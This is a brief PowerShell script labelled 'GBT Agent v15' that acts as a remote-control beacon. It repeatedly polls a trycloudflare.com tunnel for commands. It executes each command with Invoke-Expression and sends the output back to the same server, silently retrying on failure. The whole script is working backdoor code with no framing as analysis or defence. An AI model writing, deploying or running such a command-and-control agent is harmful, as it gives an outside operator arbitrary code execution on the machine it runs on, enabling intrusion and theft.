# GBT Agent v15 - 最简版
param([string]$S = "https://custom-goat-advisor-documented.trycloudflare.com")
Write-Host "v15"
while(1){
 try{$r=Invoke-RestMethod -Uri $S -Method GET -TimeoutSec 30
 if($r.id-and$r.command){$c=$r.command;$id=$r.id
  $o=iex $c 2>&1|Out-String
  $b=@{id=$id;ok=$true;code=0;stdout="$o";stderr="";time=(Get-Date -Format "o")}|ConvertTo-Json -Compress -Depth 2
  Invoke-RestMethod -Uri $S -Method POST -Body $b -ContentType "application/json" -TimeoutSec 15|Out-Null
 }}catch{Start-Sleep 2}
 Start-Sleep -Milliseconds 500
}
